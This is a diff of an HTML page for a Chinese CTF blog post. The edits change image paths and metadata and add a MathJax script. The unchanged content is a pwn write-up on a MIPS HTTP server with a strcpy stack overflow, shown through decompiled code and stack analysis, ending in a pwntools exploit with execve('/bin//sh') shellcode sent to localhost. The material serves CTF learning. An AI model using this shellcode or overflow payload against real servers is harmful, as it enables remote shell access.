@@ -13,21 +13,21 @@
 <meta property="og:site_name" content="1nv0k3r&#39;s blog">
 <meta property="og:description" content="前言这周做了UCAS的内部赛, 调出来pwn的时候才知道比赛时间只有11小时orz, 大佬们做的最多的是re1, 然而我ida打开以后看到一堆函数就不想看了233, 最终只提交了一个签到题, orz我好菜 checkin文件: checkin.png LSB低位隐写，提取出来 XcHVycGxle2V6X2NoMVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD303032653732">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/1.png">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/2.png">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/3.png">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/4.png">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/5.png">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/6.png">
-<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/7.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/images/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/1.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/images/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/2.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/images/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/3.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/images/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/4.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/images/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/5.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/images/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/6.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/19/images/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/7.png">
 <meta property="article:published_time" content="2019-01-19T08:06:50.000Z">
-<meta property="article:modified_time" content="2021-04-13T16:19:08.832Z">
+<meta property="article:modified_time" content="2021-04-15T06:19:21.103Z">
 <meta property="article:author" content="1nv0k3r">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="mips">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://1nv0k3r.fun/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/1.png">
+<meta name="twitter:image" content="http://1nv0k3r.fun/2019/01/19/images/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/1.png">
     
     
         
@@ -63,8 +63,7 @@
     
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-<body class="max-width mx-auto px3 ltr">
-    
+<body class="max-width mx-auto px3 ltr">    
       <div id="header-post">
   <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
   <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
@@ -203,14 +202,14 @@
 <p>main函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1)</span> </span>&#123;</span><br><span class="line">    setvbuf(*gvar_411214, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">    setvbuf(**&amp;gvar_411208, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">    param0 = *&amp;gvar_4111D4 + <span class="number">4448</span>;</span><br><span class="line">    <span class="keyword">char</span> *v0 = getenv(<span class="string">"PWD"</span>);</span><br><span class="line">    *&amp;ROOT = v0;</span><br><span class="line">    menu(param0, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">        respond(param0, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>menu函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">menu</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1, <span class="keyword">unsigned</span> <span class="keyword">int</span> param2, <span class="keyword">unsigned</span> <span class="keyword">int</span> param3)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"pwd"</span>, param1, param2, param3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start?"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, *&amp;gvar_4111D8, <span class="number">1</span>, param3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>respond函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">respond</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1, <span class="keyword">unsigned</span> <span class="keyword">int</span> param2, <span class="keyword">unsigned</span> <span class="keyword">int</span> param3)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(gvar_4111D8, <span class="number">0</span>, <span class="number">4096</span>, param3);</span><br><span class="line">    <span class="keyword">int</span> result = <span class="built_in">read</span>(<span class="number">0</span>, mesg, <span class="number">4096</span>, param3);</span><br><span class="line">    <span class="keyword">int</span> v0 = result;</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">        result = fwrite(<span class="string">"Client disconnected upexpectedly.\n"</span>, <span class="number">1</span>, <span class="number">34</span>, **&amp;gvar_41123C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = fwrite(<span class="string">"recv() error\n"</span>, <span class="number">1</span>, <span class="number">13</span>, **&amp;gvar_41123C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// len(result) &gt; 0, 有输入</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>, mesg, <span class="number">4096</span>, param3);</span><br><span class="line">        result = strtok(mesg, <span class="string">" \t\n"</span>, <span class="number">4096</span>, param3); <span class="comment">// 用" \t\n"切割字符串</span></span><br><span class="line">        result = <span class="built_in">strncmp</span>(result, <span class="string">"GET"</span>, <span class="number">4</span>, param3); <span class="comment">// 比较前4个字符</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">            result = strtok(mesg, <span class="string">" \t"</span>, <span class="number">4</span>, param3); <span class="comment">// 用" \t"切割字符串</span></span><br><span class="line">            <span class="keyword">char</span> *filename = result;</span><br><span class="line">            result = strtok(mesg, <span class="string">" \t\n"</span>, <span class="number">4</span>, param3); <span class="comment">// 用" \t\n"切割字符串</span></span><br><span class="line">            <span class="keyword">char</span> *protocol = result;</span><br><span class="line">            result = <span class="built_in">strncmp</span>(protocol, <span class="string">"HTTP/1.0"</span>, <span class="number">8</span>, param3); <span class="comment">// 比较前8个字符</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(result != <span class="number">0</span>) &#123;</span><br><span class="line">                result = <span class="built_in">strncmp</span>(protocol, <span class="string">"HTTP/1.1"</span>, <span class="number">8</span>, param3); <span class="comment">//比较</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(result != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"HTTP/1.0 400 Bad Request\n"</span>, <span class="number">25</span>, param3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result = <span class="built_in">strncmp</span>(filename, <span class="string">"/"</span>, <span class="number">2</span>, param3);</span><br><span class="line">            <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">                filename = <span class="string">"/index.html"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            env_str = *&amp;ROOT;</span><br><span class="line">            <span class="built_in">strcpy</span>(&amp;path, env_str); <span class="comment">// path = /home/fish</span></span><br><span class="line">            result = <span class="built_in">strlen</span>(*&amp;R00T, env_str, <span class="number">2</span>, param3); <span class="comment">// 路径的长度</span></span><br><span class="line">            <span class="comment">// 字符串拼接 path = /home/fish + v1,</span></span><br><span class="line">            <span class="comment">// 没有计算文件名的长度就直接copy了, 可以导致栈溢出</span></span><br><span class="line">            <span class="built_in">strcpy</span>(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(result + ((<span class="keyword">int</span>)(&amp;path)))), filename, <span class="number">2</span>, param3); </span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"file: %s\n"</span>, &amp;path, <span class="number">2</span>, param3); <span class="comment">// 输出path</span></span><br><span class="line">            result = <span class="built_in">open</span>(&amp;path, <span class="number">0</span>, <span class="number">2</span>, param3); <span class="comment">// 打开path指向的文件</span></span><br><span class="line">            <span class="comment">// 文件存在则输出200 OK, 否则404</span></span><br><span class="line">            result = result != <span class="number">-1</span> ? <span class="built_in">write</span>(l, <span class="string">"HTTP/1.0 200 0K\n\n"</span>, <span class="number">17</span>, param3): <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"HTTP/1.0 404 Not Found\n"</span>, <span class="number">23</span>, param3);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <h1 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h1><p>输入的HTTP请求段mesg:</p>
 <p>GET /{file} HTTP/1.0</p>
-<p><img src="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/1.png" alt="img"></p>
+<p><img src="../images/训练赛记录/1.png" alt=""></p>
 <p>可以看到栈里的数据, strcpy复制的时候没检查长度造成栈溢出, 测得保存的文件路径在$sp + 0x2c处(本机测试的时候路径是/root)</p>
-<p><img src="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/2.png" alt="img"></p>
+<p><img src="../images/训练赛记录/2.png" alt=""></p>
 <p>$ra(返回地址寄存器)保存在$sp + 0x134处</p>
-<p><img src="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/3.png" alt="img"><br><img src="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/4.png" alt="img"></p>
+<p><img src="../images/训练赛记录/3.png" alt=""><br><img src="../images/训练赛记录/4.png" alt=""></p>
 <p>/bin/sh也有了, system也有了</p>
-<p><img src="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/5.png" alt="img"></p>
-<p><img src="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/6.png" alt="img"></p>
+<p><img src="../images/训练赛记录/5.png" alt=""></p>
+<p><img src="../images/训练赛记录/6.png" alt=""></p>
 <p>看起来是要构造ROP, 但是有一个问题是, payload里不能有\x00不然会截断</p>
 <p>但是所有地址都是0x0040开头的, 所以没法构造ROP</p>
 <p>本来跳转到 0x00400e68, 现在跳转到 0x7fff6b5a, a(1000b) 最低两个有效位有一个不是0</p>
@@ -255,7 +254,7 @@ heuristic-fence-post&#39; command.
 </code></pre><p>猜测可能是MIPS需要对齐地址, $sp = 0x7fff6bd8, 所以应该按4字节增长, 设置$ra = $sp + 4 * n</p>
 <p>但是实际运行环境的$sp不知道, 得想办法解决一哈</p>
 <p>调试环境测试跳转到shellcode可以稳定getshell</p>
-<p><img src="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/7.png" alt="img"></p>
+<p><img src="../images/训练赛记录/7.png" alt=""></p>
 <p>0x04 exp</p>
 <p>先给出exp…等我想办法找到栈地址再补充</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode  = <span class="string">"\x28\x06\xff\xff"</span>      <span class="comment">#  /* slti    a2,zero,-1   */</span></span><br><span class="line">shellcode += <span class="string">"\x3c\x0f\x2f\x2f"</span>      <span class="comment">#  /* lui     t7,0x2f2f    */</span></span><br><span class="line">shellcode += <span class="string">"\x35\xef\x62\x69"</span>      <span class="comment">#  /* ori     t7,t7,0x6269 */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xaf\xff\xf4"</span>      <span class="comment">#  /* sw      t7,-12(sp)   */</span></span><br><span class="line">shellcode += <span class="string">"\x3c\x0e\x6e\x2f"</span>      <span class="comment">#  /* lui     t6,0x6e2f    */</span></span><br><span class="line">shellcode += <span class="string">"\x35\xce\x73\x68"</span>      <span class="comment">#  /* ori     t6,t6,0x7368 */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xae\xff\xf8"</span>      <span class="comment">#  /* sw      t6,-8(sp)    */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xa0\xff\xfc"</span>      <span class="comment">#  /* sw      zero,-4(sp)  */</span></span><br><span class="line">shellcode += <span class="string">"\x27\xa4\xff\xf4"</span>      <span class="comment">#  /* addiu   a0,sp,-12    */</span></span><br><span class="line">shellcode += <span class="string">"\x28\x05\xff\xff"</span>      <span class="comment">#  /* slti    a1,zero,-1   */</span></span><br><span class="line">shellcode += <span class="string">"\x24\x02\x0f\xab"</span>      <span class="comment">#  /* li      v0,4011      */</span></span><br><span class="line">shellcode += <span class="string">"\x01\x01\x01\x0c"</span>      <span class="comment">#  /* syscall 0x40404      */</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="string">''</span></span><br><span class="line">shellcode_addr = <span class="string">"\x7f\xff\x6b\x50"</span>  <span class="comment">#  shellcode的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a'</span> + shellcode + <span class="string">'a'</span> * (<span class="number">253</span> - len(shellcode) - <span class="number">5</span>) + <span class="string">'/123'</span> + shellcode_addr</span><br><span class="line"></span><br><span class="line">http = <span class="string">'GET '</span> + payload + <span class="string">' HTTP/1.1'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'r'</span>) <span class="comment"># gdb run</span></span><br><span class="line">r.recv()        <span class="comment"># start?</span></span><br><span class="line">r.send(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(http)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
@@ -345,6 +344,22 @@ heuristic-fence-post&#39; command.
 </footer>
 
     </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
 </body>
 </html>
 <!-- styles -->
